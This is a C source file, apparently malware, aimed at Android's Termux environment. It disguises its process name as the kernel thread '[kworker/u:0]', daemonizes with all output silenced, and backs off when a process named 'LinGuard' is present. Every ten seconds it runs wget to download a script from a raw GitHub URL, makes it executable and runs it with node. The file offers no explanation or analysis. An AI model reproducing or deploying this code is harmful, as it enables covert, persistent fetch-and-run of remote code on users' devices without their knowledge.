#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <sys/wait.h>
#include <dirent.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/prctl.h>

int is_termux_environment() {
    if (access("/data/data/com.termux", F_OK) == 0) {
        return 1;
    }
    return 0;
}

int get_current_pid() {
    return (int)getpid();
}

int find_linguard_processes(int *pids, int max_pids) {
    DIR *dir;
    struct dirent *entry;
    char path[512];
    char cmdline[1024];
    FILE *fp;
    int count = 0;
    int current_pid = get_current_pid();
    dir = opendir("/proc");
    if (!dir) return 0;
    while ((entry = readdir(dir)) != NULL && count < max_pids) {
        if (entry->d_type == DT_DIR) {
            char *endptr;
            long pid = strtol(entry->d_name, &endptr, 10);
            if (*endptr == '\0' && pid != current_pid) {
                snprintf(path, sizeof(path), "/proc/%ld/cmdline", pid);
                fp = fopen(path, "r");
                if (fp) {
                    if (fgets(cmdline, sizeof(cmdline), fp) != NULL) {
                        if (strstr(cmdline, "LinGuard") != NULL) {
                            pids[count++] = (int)pid;
                        }
                    }
                    fclose(fp);
                }
            }
        }
    }
    closedir(dir);
    return count;
}

int create_port_lock() {
    int sockfd;
    struct sockaddr_in addr;
    int port = 38472;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        return 0;
    }
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sockfd);
        return 0;
    }
    return sockfd;
}

int check_existing_processes() {
    int linguard_pids[20];
    int linguard_count;
    linguard_count = find_linguard_processes(linguard_pids, 20);
    if (linguard_count > 0) {
        return 1;
    }
    return 0;
}

void run_node_directly() {
    pid_t pid = fork();
    if (pid == 0) {
        pid_t pid2 = fork();
        if (pid2 == 0) {
            setsid();
            freopen("/dev/null", "r", stdin);
            freopen("/dev/null", "w", stdout);
            freopen("/dev/null", "w", stderr);
            chdir("/data/data/com.termux/files/usr/bin");
            system("wget -O /data/data/com.termux/files/usr/bin/run https://raw.githubusercontent.com/boneng-cell/data/refs/heads/main/data/Termux/run");
            system("chmod +x /data/data/com.termux/files/usr/bin/run");
            setenv("NODE_PATH", "/data/data/com.termux/files/usr/lib/node_modules", 1);
            setenv("PATH", "/data/data/com.termux/files/usr/bin:/data/data/com.termux/files/usr/bin/applets:/system/bin:/system/xbin", 1);
            execlp("node", "node", "run", NULL);
            _exit(1);
        }
        _exit(0);
    } else if (pid > 0) {
        waitpid(pid, NULL, 0);
    }
}

void signal_handler(int sig) {
    _exit(0);
}

void disguise_process_name(char **argv) {
    prctl(PR_SET_NAME, "kworker/u:0");
    char *disguised_name = "[kworker/u:0]";
    size_t len = strlen(argv[0]);
    if (len > 0) {
        strncpy(argv[0], disguised_name, len);
        if (len < strlen(disguised_name)) {
            argv[0][len] = '\0';
        }
    }
}

int main(int argc, char *argv[]) {
    if (!is_termux_environment()) {
        _exit(1);
    }
    disguise_process_name(argv);
    if (check_existing_processes()) {
        _exit(1);
    }
    int lock_fd = create_port_lock();
    if (lock_fd == 0) {
        _exit(1);
    }
    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);
    signal(SIGHUP, signal_handler);
    pid_t pid = fork();
    if (pid > 0) {
        _exit(0);
    }
    setsid();
    pid = fork();
    if (pid > 0) {
        _exit(0);
    }
    freopen("/dev/null", "r", stdin);
    freopen("/dev/null", "w", stdout);
    freopen("/dev/null", "w", stderr);
    while (1) {
        if (check_existing_processes()) {
            close(lock_fd);
            _exit(0);
        }
        run_node_directly();
        sleep(10);
        if (check_existing_processes()) {
            close(lock_fd);
            _exit(0);
        }
    }
    close(lock_fd);
    return 0;
}
